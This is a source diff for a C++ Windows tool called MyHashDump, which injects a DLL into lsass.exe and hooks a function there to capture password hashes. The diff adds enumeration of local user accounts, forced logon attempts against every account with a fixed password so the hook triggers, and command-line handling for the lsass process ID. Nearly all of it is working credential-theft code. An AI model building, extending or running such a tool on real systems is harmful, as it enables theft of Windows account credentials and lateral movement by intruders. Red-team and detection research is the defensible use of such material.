@@ -1,7 +1,9 @@
+#include <Windows.h>
 #include <stdio.h>
 #include <string>
 #include <vector>
 #include <iostream> // std::cin
+#include <LM.h>
 
 #include "MyHashDump.h"
 #include "utils/debug.h"
@@ -9,13 +11,86 @@
 #include "utils/dllinjection.h"
 #include "shared.h"
 #include "resource.h"
+#include "utils/getopt.h"
 
 MyHashDump::MyHashDump()
 {
 	threadHandle = NULL;
 	started = false;
-#ifdef _DEBUG
-#endif
+}
+
+std::vector<std::wstring> MyHashDump::getLocalUsers()
+{
+	std::vector<std::wstring> retUsers;
+
+	LPUSER_INFO_0 pBuf = NULL, pTempBuf = NULL;
+	DWORD numUsers = 0;
+	DWORD totalUsers = 0;
+
+	NET_API_STATUS nStatus = NetUserEnum(NULL, 0, FILTER_NORMAL_ACCOUNT, (LPBYTE*)&pBuf, MAX_PREFERRED_LENGTH, &numUsers, &totalUsers, NULL);
+	if ((nStatus == NERR_Success) || (nStatus == ERROR_MORE_DATA)) {
+		if ((pTempBuf = pBuf) != NULL) {
+			for (int i = 0; i < numUsers; i++) {
+				std::wstring currUser = std::wstring(pTempBuf->usri0_name, pTempBuf->usri0_name + wcslen(pTempBuf->usri0_name));
+				if (currUser.size() > 0) {
+					retUsers.push_back(currUser);
+					//printf("testing: %S\n", currUser.c_str());
+				}
+
+				pTempBuf++;
+			}
+		}
+	}
+
+	if (pBuf)
+		NetApiBufferFree(pBuf);
+
+	return retUsers;
+}
+
+void MyHashDump::spoofLogins(std::vector<std::wstring> users)
+{
+	for (std::wstring user : users) {
+		std::string cuser = convertWstringToCstring(user);
+		HANDLE token = NULL;
+		BOOL ok = LogonUserA(cuser.c_str(), NULL, "testpassword", LOGON32_LOGON_INTERACTIVE, LOGON32_PROVIDER_DEFAULT, &token);
+		//if (ok == FALSE) {
+		//	printf("\tError 0x%x, %d\n", GetLastError(), GetLastError());
+		//}
+
+	}
+}
+
+void MyHashDump::start(DWORD pid, std::string path)
+{
+	if (started == false) {
+		ioPipes.init(input_pipe_name, output_pipe_name, input_event_name, output_event_name);
+		ioPipes.start();
+
+		injector(path.c_str(), pid, "dllentry");
+
+		started = true;
+	}
+	else {
+		DebugFprintf(outlogfile, PRINT_INFO1, "MyHashDump already started...stop and then start again\n");
+	}
+}
+
+void MyHashDump::stop(DWORD pid, std::string path)
+{
+	if (started == true) {
+		writeToInput("exit");
+		Sleep(1000);
+
+		ejector(path.c_str(), pid);
+
+		ioPipes.stop();
+
+		started = false;
+	}
+	else {
+		DebugFprintf(outlogfile, PRINT_INFO1, "Nothing to stop\n");
+	}
 }
 
 bool MyHashDump::injector(const char* dllFullPath, DWORD pid, const char* functionName)
@@ -63,38 +138,6 @@ bool MyHashDump::ejector(const char* dllFullPath, DWORD pid)
 	}
 
 	return true;
-}
-
-void MyHashDump::start(DWORD pid, std::string path)
-{
-	if (started == false) {
-		ioPipes.init(input_pipe_name, output_pipe_name, input_event_name, output_event_name);
-		ioPipes.start();
-
-		injector(path.c_str(), pid, "dllentry");
-
-		started = true;
-	}
-	else {
-		DebugFprintf(outlogfile, PRINT_INFO1, "MyHashDump already started...stop and then start again\n");
-	}
-}
-
-void MyHashDump::stop(DWORD pid, std::string path)
-{
-	if (started == true) {
-		writeToInput("exit");
-		Sleep(1000);
-
-		ejector(path.c_str(), pid);
-
-		ioPipes.stop();
-
-		started = false;
-	}
-	else {
-		DebugFprintf(outlogfile, PRINT_INFO1, "Nothing to stop\n");
-	}
 }
 
 void MyHashDump::writeToInput(std::string inputcmd)
@@ -194,29 +237,76 @@ void interactive_mode(MyHashDump& hashdump, DWORD pid, std::string path)
 	}
 }
 
+void usage()
+{
+	printf("\nMyHashDump - Use function hook in lsass.exe to gather password hashes\n\n");
+	printf("Usage:\n");
+	printf("   -h              print usage menu\n");
+	printf("   -i              interactive\n");
+	printf("   -p pid          process id for lsass.exe\n");
+}
+
 int main(int argc, char** argv)
 {
 	printf("MyHashDump\n");
 
-	if (argc > 1) {
-		char curDir[MAX_PATH] = { 0 };
-		DWORD len = MAX_PATH;
-		DWORD ret = GetCurrentDirectoryA(len, curDir);
-		std::string path = std::string(curDir);
-		path = path + "\\Slice.dll";
+	DWORD pid = 0;
+	bool interactive = false;
 
-		int pid = atoi(argv[1]);
+	//argument parsing
+	int c = 0;
+	while ((c = getopt(argc, argv, "p:i")) != -1) {
 
-		write_dll(path);
-
-		MyHashDump hashdump;
-
-		interactive_mode(hashdump, pid, path);
-
-		hashdump.stop(pid, path);
-
-		remove_dll(path);
+		switch (c) {
+		case 'h':
+			usage();
+			return 1;
+		case 'p':
+			if (optarg != NULL)
+				pid = atoi(optarg);
+			break;
+		case 'i':
+			interactive = true;
+			break;
+		case '?':
+			printf("\n[-] Unrecognized option: %c\n\n", c);
+			usage();
+			return -1;
+		default:
+			printf("\n[-] Unrecognized option: %c\n\n", c);
+			usage();
+			return -1;
+		}
 	}
+
+	if (pid == 0) {
+		printf("Need to specify lsass.exe process id\n");
+		return -1;
+	}
+
+	// write injection payload to disk
+	char curDir[MAX_PATH] = { 0 };
+	DWORD len = MAX_PATH;
+	DWORD ret = GetCurrentDirectoryA(len, curDir);
+	std::string path = std::string(curDir);
+	path = path + "\\Slice.dll";
+	write_dll(path);
+
+	MyHashDump hashdump;
+	std::vector<std::wstring> users = hashdump.getLocalUsers();
+
+	if(interactive == true)
+		interactive_mode(hashdump, pid, path);
+	else {
+		hashdump.start(pid, path);
+		Sleep(1000);
+		hashdump.spoofLogins(users);
+		Sleep(1000);
+	}
+
+	hashdump.stop(pid, path);
+
+	remove_dll(path);
 
 #ifdef _DEBUG
 	_CrtDumpMemoryLeaks();
